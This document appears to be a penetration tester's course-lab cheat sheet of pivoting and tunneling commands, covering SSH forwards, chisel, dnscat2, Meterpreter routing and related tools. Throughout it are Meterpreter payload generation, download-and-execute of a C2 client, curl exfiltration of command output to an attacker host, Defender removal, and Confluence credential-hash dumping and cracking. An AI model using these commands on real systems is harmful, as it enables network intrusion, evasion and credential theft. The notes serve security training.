# Port Redirection and SSH Tunneling (Command Appendix)

Part of [[COMMAND APPENDIX]]. Exact syntax for pivoting and tunneling tools -- no explanations, just commands. For decision logic ("which technique do I use?"), see [[Port Redirection and SSH Tunneling (Decision Tree)]]. For teardowns ("why do these flags exist?"), see [[Pivoting & Tunneling (Breakdowns)]].

---

## Socat Port Forward (Linux)

```bash
# Listen on PORT, forward to DEST_IP:DEST_PORT
socat -ddd TCP-LISTEN:PORT,fork TCP:DEST_IP:DEST_PORT

# Example: forward port 2345 on CONFLUENCE01 to postgres on PGDATABASE01
socat -ddd TCP-LISTEN:2345,fork TCP:10.4.50.215:5432

# Example: forward port 2222 → SSH on PGDATABASE01
socat -ddd TCP-LISTEN:2222,fork TCP:10.4.50.215:22
```

**Confirm it's listening:**
```bash
ss -ntplu   # look for TCP *:2345 owned by socat
```

**Connect from Kali through the forward:**
```bash
psql -h 192.168.50.63 -p 2345 -U postgres
ssh database_admin@192.168.50.63 -p2222
```

No-socat fallback (when socat isn't installed):
```bash
mkfifo /tmp/f
nc -l -p PORT < /tmp/f | nc DEST_IP DEST_PORT > /tmp/f
```

---

## SSH Local Port Forward (-L)

Listening port opens on the **SSH client** (the pivot). Kali must be able to connect inbound to the pivot host.

```bash
# On CONFLUENCE01 (the pivot / SSH client):
ssh -N -L [BIND_IP:]LOCAL_PORT:DEST_IP:DEST_PORT user@SSH_SERVER

# -N  = no remote shell, just port forward
# -L  = local forward
# 0.0.0.0 = listen on all interfaces (omitting IP binds to loopback only)

# Example: CONFLUENCE01 listens on :4455, forwards SMB to HRSHARES via PGDATABASE01
ssh -N -L 0.0.0.0:4455:172.16.50.217:445 database_admin@10.4.50.215 -o StrictHostKeyChecking=no

# Kali connects to the pivot's listening port
smbclient -p 4455 -L //192.168.50.63/ -U hr_admin --password=Welcome1234
smbclient -p 4455 //192.168.50.63/scripts -U hr_admin --password=Welcome1234
```

**Prerequisite (when running from a reverse shell):**
```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'   # PTY upgrade first
```

---

## SSH Dynamic Port Forward (-D)

Opens a SOCKS proxy on the **SSH client** (pivot). All proxychains traffic routes through it to unlimited destinations reachable by the SSH server.

```bash
# On CONFLUENCE01:
ssh -N -D [BIND_IP:]PORT user@SSH_SERVER

# Example: SOCKS proxy on all interfaces :9999 on CONFLUENCE01, SSH server = PGDATABASE01
ssh -N -D 0.0.0.0:9999 database_admin@10.4.50.215 -o StrictHostKeyChecking=no

# Update /etc/proxychains4.conf on Kali:
# [ProxyList]
# socks5 192.168.50.63 9999

# Use proxychains on Kali:
proxychains smbclient -L //172.16.50.217/ -U hr_admin --password=Welcome1234
proxychains nmap -vvv -sT --top-ports=20 -Pn -n 172.16.50.217
```

**Confirm listening on pivot:**
```bash
ss -ntplu   # look for 0.0.0.0:9999 owned by ssh
```

---

## SSH Remote Port Forward (-R)

Listening port opens on the **SSH server (Kali)**. The pivot SSH's outbound to Kali -- bypasses inbound firewall rules on the pivot.

```bash
# Prerequisites on Kali:
sudo systemctl start ssh

# On CONFLUENCE01 (the pivot / SSH client):
ssh -N -R [BIND_IP:]BIND_PORT:DEST_IP:DEST_PORT kali@KALI_IP

# -R  = remote forward
# BIND_IP:BIND_PORT = what to open on KALI (SSH server side)
# DEST_IP:DEST_PORT = what to forward to (done by CONFLUENCE01)
# Binding to 127.0.0.1 keeps the listening port local to Kali only

# Example: Kali loopback :2345, forwards to PGDATABASE01:5432
ssh -N -R 127.0.0.1:2345:10.4.50.215:5432 kali@192.168.118.4 -o StrictHostKeyChecking=no

# From Kali:
psql -h 127.0.0.1 -p 2345 -U postgres
```

**Port conflict fix:** if nc listener is already on target port, pick a different local port:
```bash
# nc on 4444, so use 5555 instead:
ssh -N -R 127.0.0.1:5555:10.4.50.215:4444 kali@KALI_IP -o StrictHostKeyChecking=no
```

---

## SSH Remote Dynamic Port Forward

SOCKS proxy opens on **Kali** (SSH server). Pivot SSH's outbound. Requires OpenSSH **client** 7.6+ on the pivot.

```bash
# On CONFLUENCE01:
ssh -N -R PORT kali@KALI_IP   # only one socket argument (no destination)
# Binds to Kali loopback by default

# Example:
ssh -N -R 9998 kali@192.168.118.4 -o StrictHostKeyChecking=no

# Check pivot OpenSSH version first:
ssh -V   # need OpenSSH 7.6+

# Update /etc/proxychains4.conf on Kali:
# [ProxyList]
# socks5 127.0.0.1 9998

# Use proxychains on Kali exactly as with dynamic forward:
proxychains nmap -vvv -sT --top-ports=20 -Pn -n 10.4.50.64
```

---

## sshuttle (VPN-like transparent routing)

No proxychains prefix needed. Kali must have root; SSH server (pivot) must have Python3.

```bash
# From Kali (as root):
sshuttle -r user@PIVOT_IP:PORT SUBNET1/24 SUBNET2/24

# Example: tunnel via CONFLUENCE01's Socat forward to PGDATABASE01 as SSH server
sshuttle -r database_admin@192.168.50.63:2222 10.4.50.0/24 172.16.50.0/24

# After running, connect transparently without proxychains:
smbclient -L //172.16.50.217/ -U hr_admin --password=Welcome1234
```

---

## Proxychains Configuration

```bash
# Edit (requires sudo):
sudo nano /etc/proxychains4.conf

# [ProxyList] section must match the SOCKS port in use:
socks5 192.168.50.63 9999    # SSH dynamic (local forward), pivot host + port
socks5 127.0.0.1 9998        # SSH remote dynamic, Kali loopback port

# After any sed edit, always verify:
sudo tail -3 /etc/proxychains4.conf

# Sed to update ProxyList (match exact current line):
sudo sed -i 's/socks5 192.168.50.63 9999/socks5 127.0.0.1 9998/' /etc/proxychains4.conf
# Warning: if the current entry is already socks5 but pattern says socks4, sed silently does nothing
```

**nmap through proxychains (mandatory flags):**
```bash
proxychains nmap -vvv -sT -Pn -n -p PORT DEST_IP
# -sT   = TCP connect scan (SYN scan won't work through SOCKS)
# -Pn   = skip host discovery (ICMP doesn't work through SOCKS)
# -n    = no DNS resolution (DNS may stall or leak)
```

---

## Hashcat (Atlassian PBKDF2 hashes from Confluence DB)

```bash
hashcat -m 12001 hashes.txt /usr/share/wordlists/fasttrack.txt
# -m 12001 = Atlassian (PBKDF2-HMAC-SHA1), hashes start with {PKCS5S2}
```

PostgreSQL enumeration once connected through a forward:
```bash
psql -h HOST -p PORT -U username
postgres=# \l              # list databases
postgres=# \c dbname       # connect to database
postgres=# \dt             # list tables
postgres=# \d tablename    # describe table columns
postgres=# SELECT user_name,credential FROM cwd_user;   # Confluence user hashes
# Real column names: user_name + credential (not username/user_password as module text shows)
```

---

## Windows: ssh.exe (OpenSSH for Windows)

Identical syntax to Linux. Available from Windows 1803+.

```cmd
REM Locate:
where ssh
REM C:\Windows\System32\OpenSSH\ssh.exe

REM Check version (need 7.6+ for remote dynamic):
ssh.exe -V

REM Remote dynamic port forward from Windows pivot back to Kali:
ssh -N -R 9998 kali@KALI_IP

REM Remote port forward (specific destination):
ssh -N -R 127.0.0.1:PORT:DEST_IP:DEST_PORT kali@KALI_IP
```

Then use proxychains on Kali exactly as with Linux remote dynamic.

---

## Windows: Plink

No OpenSSH needed. Download from Kali, no installation required.

```bash
# On Kali: find and serve plink.exe
find / -name plink.exe 2>/dev/null
# /usr/share/windows-resources/binaries/plink.exe
sudo cp /usr/share/windows-resources/binaries/plink.exe /var/www/html/
sudo systemctl start apache2
```

```cmd
REM On Windows: download plink
powershell wget -Uri http://KALI_IP/plink.exe -OutFile C:\Windows\Temp\plink.exe

REM Remote port forward (interactive shell -- can type at prompt):
C:\Windows\Temp\plink.exe -ssh -l kali -pw KALI_PASSWORD -R 127.0.0.1:9833:127.0.0.1:3389 KALI_IP

REM Non-interactive shell (web shell / reverse shell): pipe y to accept host key:
cmd.exe /c echo y | C:\Windows\Temp\plink.exe -ssh -l kali -pw KALI_PASSWORD -R 127.0.0.1:9833:127.0.0.1:3389 KALI_IP
```

Note: Plink does NOT support remote dynamic port forwarding (`-R PORT` only form). One destination only per connection.

Connect from Kali once port is open:
```bash
xfreerdp /u:rdp_admin /p:'P@ssw0rd!' /v:127.0.0.1:9833
```

---

## Windows: Netsh Portproxy (admin required, no upload needed)

```cmd
REM Add portproxy rule:
netsh interface portproxy add v4tov4 listenport=2222 listenaddress=192.168.50.64 connectport=22 connectaddress=10.4.50.215

REM Add Windows Firewall rule to allow the new port:
netsh advfirewall firewall add rule name="port_forward_ssh_2222" protocol=TCP dir=in localip=192.168.50.64 localport=2222 action=allow

REM Confirm portproxy:
netsh interface portproxy show all

REM Confirm listening:
netstat -anp TCP | find "2222"

REM Cleanup (always do this after):
netsh advfirewall firewall delete rule name="port_forward_ssh_2222"
netsh interface portproxy del v4tov4 listenport=2222 listenaddress=192.168.50.64
```

From Kali:
```bash
ssh database_admin@192.168.50.64 -p2222
```

---

## Subnet Enumeration (before setting up the right forward)

```bash
# From a pivot shell: find alive hosts and open ports in adjacent subnets
for i in $(seq 1 254); do nc -zv -w 1 172.16.50.$i 445; done 2>&1 | grep -v refused | grep -v timed

# From Kali via proxychains:
proxychains nmap -vvv -sT -Pn -n --top-ports 20 172.16.50.0/24
```

---

## Meterpreter Tunneling (autoroute + socks_proxy)

Full MSF-based pivot, no SSH needed on the pivot host.

```bash
# 1. Generate Linux Meterpreter payload
msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=<kali-ip> LPORT=8080 -f elf -o pivot.elf

# 2. Catch it
msfconsole -q
use exploit/multi/handler
set payload linux/x64/meterpreter/reverse_tcp
set LHOST 0.0.0.0
set LPORT 8080
run
```

Once session is open:
```
# In msfconsole:
bg                                      # background the meterpreter session

use auxiliary/server/socks_proxy
set SRVPORT 9050
set SRVHOST 0.0.0.0
set VERSION 4a
run                                     # starts as background job

sessions -i 1                           # reattach to session
run autoroute -s 172.16.5.0/23         # add route through session
run autoroute -p                        # verify routes
```

On Kali, `/etc/proxychains.conf` must have `socks4 127.0.0.1 9050`. Then use proxychains normally.

**Ping sweep from within a Meterpreter shell:**
```bash
# After: meterpreter > shell; then bash -i
for i in {1..254}; do (ping -c 1 172.16.5.$i | grep "bytes from" &); done
```

**multi/manage/autoroute module (reads pivot's own routing table automatically):**
```bash
# Background session first, then:
use multi/manage/autoroute
set SESSION 1
run
# Adds all subnets the pivot knows about automatically
route print    # verify

# Or add manually:
route add 172.16.5.0/24 1   # route this subnet via session 1
route print
route flush                  # remove all
```

**portfwd (single-service, no proxychains):**
```bash
# Inside a Meterpreter session on the pivot host:
portfwd add -l 3389 -p 3389 -r 172.16.5.200
portfwd list
# Kali's 127.0.0.1:3389 → pivot → 172.16.5.200:3389
xfreerdp /v:127.0.0.1 /u:user   # connect directly, no proxychains
```

**Pivot via MSF route — use bind_tcp for second-hop exploits:**
```bash
# Routes only forward connections Kali initiates TO the target.
# Internal target has no route back to Kali → reverse_tcp fails.
# Use bind_tcp: Kali connects to the target's open port via the route.
use exploit/windows/smb/psexec
set RHOSTS 172.16.5.200
set SMBUser luiza
set SMBPass "Passw0rd!"
set payload windows/x64/meterpreter/bind_tcp
set LPORT 8000
run   # session opens via session 1's route
```

**Socat + Meterpreter bind_tcp (when pivot host relays to an internal bind listener):**
```bash
# On pivot host:
socat TCP-LISTEN:8080,fork TCP:172.16.5.19:8443

# Msfvenom:
msfvenom -p windows/x64/meterpreter/bind_tcp LPORT=8443 -f exe -o bind.exe

# Handler on Kali (RHOST required for bind):
use exploit/multi/handler
set payload windows/x64/meterpreter/bind_tcp
set LPORT 8080
set RHOST <pivot-host-ip>
run
```

| Method | Best for | proxychains? |
|---|---|---|
| `route add` + MSF modules | Running MSF modules against internal hosts | No |
| `autoroute` + `socks_proxy` | Non-MSF tools (xfreerdp, nmap, etc.) | Yes |
| `portfwd` | Single service, quick access | No |

Cross-link: [[21. The Metasploit Framework#21.3.3 Pivoting with Metasploit|Module 21 §21.3.3]]

---

## Rpivot (HTTP-Tunneled SOCKS Proxy)

Server runs on Kali; client runs on pivot host. Traffic tunnels over HTTP.

```bash
# On Kali — clone and start server
git clone https://github.com/klsecservices/rpivot.git
cd rpivot
python2.7 server.py --proxy-port 9050 --server-port 9999 --server-ip 0.0.0.0
# SOCKS proxy on :9050; client connects in on :9999
```

```bash
# Transfer rpivot dir to pivot host (scp -r), then:
python2.7 client.py --server-ip <kali-ip> --server-port 9999
```

Requires `socks4 127.0.0.1 9050` in proxychains.conf. Uses Python 2.7.

**With upstream NTLM corporate proxy on the pivot host:**
```bash
python2.7 client.py --server-ip <kali-ip> --server-port 9999 \
  --ntlm-proxy-ip <proxy-ip> --ntlm-proxy-port <proxy-port> \
  --domain <domain> --username <user> --password <pass>
```

---

## Dnscat2 (DNS Tunneling)

C2 over DNS queries. Server = Kali (Ruby). Client = Windows target (PowerShell).

```bash
# On Kali — install and run server
git clone https://github.com/iagox86/dnscat2.git
cd dnscat2/server/
sudo gem install bundler && bundle install
sudo ruby dnscat2.rb --dns host=<kali-ip>,port=53,domain=<domain> --no-cache
# Note the pre-shared secret printed at startup
```

```powershell
# On Windows target — download and run client
(New-Object Net.WebClient).DownloadFile('http://<kali-ip>/dnscat2.ps1', 'dnscat2.ps1')
Import-Module .\dnscat2.ps1
Start-Dnscat2 -DNSServer <kali-ip> -Domain <domain> -PreSharedSecret <secret> -Exec cmd
```

```
# Back in dnscat2 server — interact with the session
dnscat2> window -i 1
exec (HOSTNAME) 1> type C:\Users\htb-student\Documents\flag.txt
```

---

## Chisel Reverse SOCKS (HTTP Tunnel — DPI Bypass, Server on Kali)

Use when DPI only allows outbound HTTP from the pivot. Chisel wraps the SOCKS tunnel inside HTTP WebSocket, bypassing DPI that would kill raw SSH.

```bash
# --- On Kali ---

# 1. Download compatible binary (Go 1.19 compiled — avoids glibc 2.32/2.34 error on older targets)
wget https://github.com/jpillora/chisel/releases/download/v1.8.1/chisel_1.8.1_linux_amd64.gz
gunzip chisel_1.8.1_linux_amd64.gz && chmod +x chisel_1.8.1
sudo cp chisel_1.8.1 /var/www/html/chisel

# 2. Start Apache to serve the binary
sudo systemctl start apache2

# 3. Start Chisel server (MUST have --reverse for reverse SOCKS to work)
chisel server --port 8080 --reverse
# Output: server: Listening on http://0.0.0.0:8080

# 4. Verify SOCKS port is bound after client connects:
ss -ntplu | grep 1080
# Expected: tcp LISTEN 127.0.0.1:1080 ... chisel
```

```bash
# --- On pivot (CONFLUENCE01 via CVE-2022-26134 injection) ---

# Download binary:
wget <kali-ip>/chisel -O /tmp/chisel && chmod +x /tmp/chisel

# Start client (R:socks = reverse SOCKS proxy on server's port 1080):
/tmp/chisel client <kali-ip>:8080 R:socks
```

Chisel server confirms:
```
session#N: tun: proxy#R:127.0.0.1:1080=>socks: Listening
```

**SSH through the SOCKS proxy (use ncat — Kali's nc doesn't support SOCKS):**
```bash
sudo apt install ncat

ssh -o ProxyCommand='ncat --proxy-type socks5 --proxy 127.0.0.1:1080 %h %p' user@<internal-host>
# %h and %p are SSH placeholders replaced with the target host and port at runtime
```

**Blind command output collection pattern (when you have no stderr back from the injection):**
```bash
# Run command, redirect ALL output to file, POST it back via curl:
/tmp/chisel client <kali-ip>:8080 R:socks &> /tmp/output; curl --data @/tmp/output http://<kali-ip>:8080/
# &> redirects stdout+stderr; curl --data @/file sends file contents as POST body
# Your Chisel server or tcpdump shows the POST body with the error text
```

---

## Chisel Specific Reverse Port Forward (Single Service, No SOCKS)

When a tool hardcodes `127.0.0.1:PORT` and you just need one service exposed, skip SOCKS and use a specific reverse port forward:

```bash
# Client on pivot:
/tmp/chisel client <kali-ip>:8080 R:<local-port>:<internal-host>:<internal-port>

# Example: bind 4141 on Kali loopback, forward to PGDATABASE01:8008 via CONFLUENCE01
/tmp/chisel client <kali-ip>:8080 R:4141:10.4.249.215:8008
# Kali's 127.0.0.1:4141 now routes to PGDATABASE01:8008 through CONFLUENCE01
```

Server confirms: `tun: proxy#R:127.0.0.1:4141=>10.4.249.215:8008: Listening`

---

## Chisel Combined: Reverse SOCKS + Specific Port Forward (dual-remote, one connection)

When you need BOTH a full SOCKS proxy (for proxychains) AND a specific port forwarded to browse an internal web app, pass both remotes in a single `chisel client` call. One WebSocket connection handles both.

```bash
# Kali — server (unchanged, --reverse is still required)
./chisel server -p 8080 --reverse

# Pivot (Windows — one command for both tunnels)
# Kill stale instances first:
taskkill /F /IM chisel.exe

# Then:
.\chisel.exe client <KALI>:8080 R:1081:socks R:80:172.16.6.241:80
# R:1081:socks    → SOCKS5 proxy on Kali:1081 (use in proxychains4.conf)
# R:80:172.16.6.241:80  → Kali port 80 forwards to INTERNALSRV1's web server

# Linux pivot (same syntax, different binary)
/tmp/chisel client <KALI>:8080 R:1081:socks R:4141:10.4.50.215:8008
```

**proxychains4.conf** entry (matches the SOCKS port above):
```
socks5 127.0.0.1 1081
```

**Browsing the forwarded service:** add the domain to `/etc/hosts`:
```bash
echo "127.0.0.1  internalsrv1.beyond.com" | sudo tee -a /etc/hosts
# Now http://internalsrv1.beyond.com/ routes through the tunnel
```

Server confirms both remotes:
```
tun: proxy#R:127.0.0.1:1081=>socks: Listening
tun: proxy#R:127.0.0.1:80=>172.16.6.241:80: Listening
```

> If chisel.exe is locked by a stale process ("file in use"), `taskkill /F /IM chisel.exe` kills all instances. If multiple stale background processes exist, `taskkill` lists their PIDs — verify they are all gone before re-downloading.

See [[27. Assembling the Pieces#27.4.2 Services and Sessions — Internal Network Scan|Module 27 §27.4.2]] and [[Pivoting & Tunneling (Breakdowns)#Chisel dual-remote]].

---

## SSH Background Local Port Forward (-fNL)

Bring a remote host's listening port to your local loopback without an interactive shell:

```bash
ssh -fNL <localport>:<remote-host>:<remoteport> user@<ssh-server>
# -f = fork to background after password
# -N = no remote shell, port forward only
# -L = local port forward

# Example: bring FELINEAUTHORITY's localhost:4141 to Kali's localhost:4141
ssh -fNL 4141:127.0.0.1:4141 kali@192.168.249.7

# Use when: a tool hardcodes 127.0.0.1:PORT but the actual listener
# (e.g. dnscat2 listen) is bound on a remote host.
```

---

## dnscat2 Linux Setup (Auth NS + Binary Client)

Full setup when you control the authoritative DNS server for a domain. Pivot host queries its DNS resolver, which forwards to your server.

```bash
# --- On FELINEAUTHORITY (auth NS for feline.corp) ---
dnscat2-server feline.corp
# Requires sudo for UDP/53 binding (enter password when prompted)
# Output: Starting Dnscat2 DNS server on 0.0.0.0:53 [domains = feline.corp]...
# Note the --secret=XXXX printed — use it with the client for stability

# --- On PGDATABASE01 (pivot) --- binary is pre-installed at ~/dnscat/dnscat
cd ~/dnscat
./dnscat feline.corp                              # basic (uses default DNS resolver)

# If sessions keep dropping (systemd-resolved cache issues):
./dnscat --dns server=<MULTISERVER03_IP>,port=53,domain=feline.corp --secret=<secret>
# Note: domain= MUST go inside --dns flag (comma-separated), NOT as a positional argument

# --- Back on FELINEAUTHORITY dnscat2 server ---
dnscat2> window -i 1                               # attach to session (do this FAST — ~20 attempt timeout)
command (pgdatabase01) 1> listen 0.0.0.0:4141 172.16.249.217:4646
# Listening on 0.0.0.0:4141, sending connections to 172.16.249.217:4646

# Then on Kali: SSH local port forward to bring FELINEAUTHORITY's 4141 to localhost:
ssh -fNL 4141:127.0.0.1:4141 kali@<FELINEAUTHORITY_IP>
```

---

## Blind Command Output Collection (Generic Pattern)

When you can execute commands but can't see the output (web shell injection, blind RCE):

```bash
# On the target — run command, collect output, POST back:
<any-command> &> /tmp/output; curl --data @/tmp/output http://<kali-ip>:<port>/

# On Kali — listen with nc (shows raw HTTP POST body):
nc -lvnp <port>

# Or: listen with a running Chisel server — output appears in tcpdump or Chisel server log
```

---

## Chisel SOCKS5 — Forward Variant (Server on Pivot Host)

Pivot host runs as server; Kali connects as client. Compare with reverse variant in [[Chisel]] Modern Tooling.

```bash
# Download (use consistent version on both sides)
wget https://github.com/jpillora/chisel/releases/download/v1.7.6/chisel_1.7.6_linux_amd64.gz
gunzip chisel_1.7.6_linux_amd64.gz
chmod +x chisel_1.7.6_linux_amd64

# Transfer to pivot host, then run as server:
./chisel_1.7.6_linux_amd64 server -v -p 9001 --socks5
# Output: "Listening on http://0.0.0.0:9001"

# On Kali — run as client (creates SOCKS5 on 127.0.0.1:1080)
./chisel_1.7.6_linux_amd64 client -v <pivot-host-ip>:9001 socks
```

Update proxychains.conf:
```
#socks4    127.0.0.1 9050     <- comment out
socks5 127.0.0.1 1080          <- add this
```

| Variant | Server | Client | SOCKS port |
|---------|--------|--------|------------|
| Forward (this) | Pivot host | Kali | 1080 (on Kali) |
| Reverse (see [[Chisel]]) | Kali | Pivot host | 1080 (on Kali) |

---

## ptunnel-ng (ICMP Tunneling)

Wraps TCP inside ICMP echo packets. Requires root on both sides.

```bash
# Build static binary on Kali
git clone https://github.com/utoni/ptunnel-ng.git
sudo apt install automake autoconf -y
cd ptunnel-ng/
sed -i '$s/.*/LDFLAGS=-static "${NEW_WD}\/configure" --enable-static $@ \&\& make clean \&\& make -j${BUILDJOBS:-4} all/' autogen.sh
./autogen.sh
cd ~

# Transfer to pivot host
scp -r ptunnel-ng ubuntu@<pivot-host>:~/

# On pivot host — run as server (forwards to local SSH port 22)
sudo ./ptunnel-ng/src/ptunnel-ng -r<pivot-host-ip> -R22

# On Kali — run as client (TCP :2222 → ICMP → pivot → pivot:22)
sudo ./ptunnel-ng/src/ptunnel-ng -p<pivot-host-ip> -l2222 -r<pivot-host-ip> -R22
```

**Use via SSH through the ICMP tunnel:**
```bash
ssh -p2222 -lubuntu 127.0.0.1                  # basic test
ssh -D 9050 -p2222 -lubuntu 127.0.0.1           # + dynamic port forward for proxychains
```

---

## SocksOverRDP + Proxifier (Windows-Only Multi-Hop via RDP)

Tunnels SOCKS through an RDP virtual channel. Requires admin on both Windows hops.

```bash
# On Kali — download and extract
wget https://github.com/nccgroup/SocksOverRDP/releases/download/v1.0/SocksOverRDP-x64.zip
wget https://www.proxifier.com/download/ProxifierPE.zip
unzip SocksOverRDP-x64.zip   # SocksOverRDP-Plugin.dll + SocksOverRDP-Server.exe
unzip ProxifierPE.zip         # Proxifier.exe
```

**On first Windows hop (RDP-accessible from Kali):**
```powershell
# Disable Windows Defender first (or DLL gets deleted)
# Then copy in DLL + Server.exe + Proxifier PE directory

# Register plugin (creates SOCKS listener on 127.0.0.1:1080 when mstsc.exe connects)
regsvr32.exe SocksOverRDP-Plugin.dll

# Open mstsc.exe → connect to inner Windows host
# (Plugin negotiates SOCKS channel via RDP virtual channel)
```

**On inner Windows host (second hop):**
```powershell
# Remove Defender (required)
Uninstall-WindowsFeature -Name Windows-Defender

# Run server (copy from first hop via RDP clipboard)
.\SocksOverRDP-Server.exe   # run as admin
```

**Back on first hop — run Proxifier:**
```
Proxifier.exe → Profile → Proxy Servers → Add: 127.0.0.1:1080, SOCKS5
# Now any tool Proxifier intercepts routes through the SOCKS channel
# Open mstsc.exe → connect to final target (routes via SocksOverRDP channel)
```

#### Tags: #CommandAppendix #PortForwarding #SSHTunneling #Pivoting #Socat #sshuttle #Proxychains #Plink #Netsh #Meterpreter #autoroute #Rpivot #Dnscat2 #Chisel #ptunnel-ng #ICMP #SocksOverRDP #Proxifier #ProxyCommand #Ncat #DPI #HTTPTunnel #DNSTunnel #Module19 #Module20 #HTBSupplementary #DualRemote #ReverseSocks #Module27
